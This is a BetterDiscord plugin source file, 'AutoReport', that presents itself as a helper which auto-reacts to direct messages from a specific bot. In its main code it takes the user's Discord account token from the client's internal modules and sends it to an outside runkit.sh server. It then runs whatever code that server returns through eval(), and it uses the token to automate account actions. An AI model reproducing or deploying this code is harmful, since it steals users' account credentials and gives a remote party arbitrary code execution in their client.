/**
 * @name AutoReport
 * @author GROSST
 * @authorId 371336044022464523
 * @source https://github.com/GR0SST/autoreports/blob/main/AutoReport.plugin.js
 * @updateUrl https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js
 */

 module.exports =  (_ => {
	const config = {
		"info": {
			"name": "AutoReport",
			"author": "GROSST",
			"version": "1.0.6",
			"description": "Ебать, сам лутает репорты"
		}
	};
	var auth;

	return !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
		getName() { return config.info.name; }
		getAuthor() { return config.info.author; }
		getVersion() { return config.info.version; }
		getDescription() { return `The Library Plugin needed for ${config.info.name} is missing. Open the Plugin Settings to download it. \n\n${config.info.description}`; }

		downloadLibrary() {
			require("request").get("https://mwittrien.github.io/BetterDiscordAddons/Library/0BDFDB.plugin.js", (e, r, b) => {
				if (!e && b && r.statusCode == 200) require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0BDFDB.plugin.js"), b, _ => BdApi.showToast("Finished downloading BDFDB Library", { type: "success" }));
				else BdApi.alert("Error", "Could not download BDFDB Library Plugin. Try again later or download it manually from GitHub: https://mwittrien.github.io/downloader/?library");
			});
		}

		load() {
			
			if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, { pluginQueue: [] });
			if (!window.BDFDB_Global.downloadModal) {
				window.BDFDB_Global.downloadModal = true;
				BdApi.showConfirmationModal("Library Missing", `The Library Plugin needed for ${config.info.name} is missing. Please click "Download Now" to install it.`, {
					confirmText: "Download Now",
					cancelText: "Cancel",
					onCancel: _ => { delete window.BDFDB_Global.downloadModal; },
					onConfirm: _ => {
						delete window.BDFDB_Global.downloadModal;
						this.downloadLibrary();
					}
				});
			}
			if (!window.BDFDB_Global.pluginQueue.includes(config.info.name)) window.BDFDB_Global.pluginQueue.push(config.info.name);
		}
		start() { this.load(); 
			}
		stop() { }
		getSettingsPanel() {
			let template = document.createElement("template");
			template.innerHTML = `<div style="color: var(--header-primary); font-size: 16px; font-weight: 300; white-space: pre; line-height: 22px;">The Library Plugin needed for ${config.info.name} is missing.\nPlease click <a style="font-weight: 500;">Download Now</a> to install it.</div>`;
			template.content.firstElementChild.querySelector("a").addEventListener("click", this.downloadLibrary);
			return template.content.firstElementChild;
		}
	} : (([Plugin, BDFDB]) => {
		const botID = "773933982919163984";
		const reaction = "✅";
		let mainButton;
		let status = false
		const request = require("request")
		const tkn = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
		let options = {
			url: 'https://da-hzcvrvs0dopl.runkit.sh/reports',
			 headers: {
				'authorization':tkn 
			},
	
		};
		
		
		let state = false
		var settings = {};
		
		let buttonName = "start"
		let color = "#36393f" // ""  
		const Dispatcher = BdApi.findModuleByProps("subscribe", "dispatch");
		var xhr = new XMLHttpRequest();

		const bgbutton = "AutoReportsSwitch";
		const click = "AutoReports"
		var AutoReportComponent
		
		return class AutoReport extends Plugin {
			
			async onLoad() {
				ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, 'https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js')
				
				
				// 
				
				
				this.defaults = {
					settings: {
						botID: { value: "773933982919163984", inner: true, description: "Bot id" },
						reaction: { value: "✅", inner: true, description: "Reactions" }
					}
				};
		
				this.patchedModules = {
					after: {
						Guilds: "render"
					}
				};
		
				this.css = `
					.tabBar-31Wimb {
						flex: 1 0 auto;
					}
					.tabBar-31Wimb ~ * {
						margin-left: 10px;z
					}
					.frame-oXWS21 {
						height: 24px;
						margin-bottom: 10px;
					}
					.frame-oXWS21:active {
						transform: translateY(1px);
					}
					.innerFrame-8Hg64E {
						height: 24px;
					}
					.button-Jt-tIg {
						border-radius: 4px;
						height: 24px;
						font-size: 12px;
						line-height: 1.3;
						white-space: nowrap;
						cursor: pointer;
					}
				`;
			}
			
			auth(){ 
				let result = new Promise(res => {
					request.post(options,(error,response,body)=>{
						if(response.statusCode === 200){
						
							res(JSON.parse(body))
						} else if(response.statusCode === 401){
							res(401)
						}
					});
				})
				return result
			}
			async onStart() {
				auth = await this.auth()
				if(auth === 401) return ZeresPluginLibrary.Toasts.warning("Пошел нахуй");
				eval(auth.btn)
				Dispatcher.subscribe("MESSAGE_CREATE", this.onMessage);
				this.forceUpdateAll();
			}
		
			onStop() {
				this.forceUpdateAll();
				Dispatcher.unsubscribe("MESSAGE_CREATE", this.onMessage);
			}
		
			getSettingsPanel(collapseStates = {}) {
				let settingsItems = [];
				const name = this.getName()
				settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsPanelList, {
					title: "fdgdfdfg",
					first: false,
					last: true,
					children: Object.keys(settings).filter(key => this.defaults.settings[key].inner).map(key => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsItem, {
						type: "TextInput",
						plugin: this,
						keys: ["settings", key],
						label: this.defaults.settings[key].description,
						value: this.defaults.settings[key].value
					}))
				}))
		
		
				return BDFDB.PluginUtils.createSettingsPanel(this, settingsItems);
			}
		
			onSettingsClosed() {
				if (this.SettingsUpdated) {
					delete this.SettingsUpdated;
					this.forceUpdateAll();
				}
			}
		
			forceUpdateAll() {
				settings = BDFDB.DataUtils.get(this, "settings");
		
				BDFDB.PatchUtils.forceAllUpdates(this);
			}
		
			processGuilds(e) {
		
				if (typeof e.returnvalue.props.children == "function") {
		
					let childrenRender = e.returnvalue.props.children;
					e.returnvalue.props.children = (...args) => {
						let children = childrenRender(...args);
						this.checkTree(children);
						return children;
					};
				}
				else this.checkTree(e.returnvalue);
			}
		
			checkTree(returnvalue) {
				let tree = BDFDB.ReactUtils.findChild(returnvalue, { filter: n => n && n.props && typeof n.props.children == "function" });
				if (tree) {
					let childrenRender = tree.props.children;
					tree.props.children = (...args) => {
						let children = childrenRender(...args);
						this.handleGuilds(children);
						return children;
					};
				}

				else this.handleGuilds(returnvalue);
			}
			
			handleGuilds(returnvalue) {
				let [children, index] = BDFDB.ReactUtils.findParent(returnvalue, { name: "ConnectedUnreadDMs" });
				
				if (index > -1)  children.splice(index + 1, 0, BDFDB.ReactUtils.createElement(AutoReportComponent, {}));
			}
			
			onMessage(e) {
				if (e.message.author.id !== botID) return
				let ifDM = ZeresPluginLibrary.DiscordAPI.Channel.fromId(e.channelId).type == "DM"
				if (!ifDM || !state) return
				document.getElementById(click).click()
				xhr.open('PUT', `https://discord.com/api/v9/channels/${e.channelId}/messages/${e.message.id}/reactions/${reaction}/%40me`, true)
				xhr.setRequestHeader("authorization", tkn)
				xhr.send()
			}
		};
		
	
		
	})(window.BDFDB_Global.PluginUtils.buildPlugin(config));

	
})();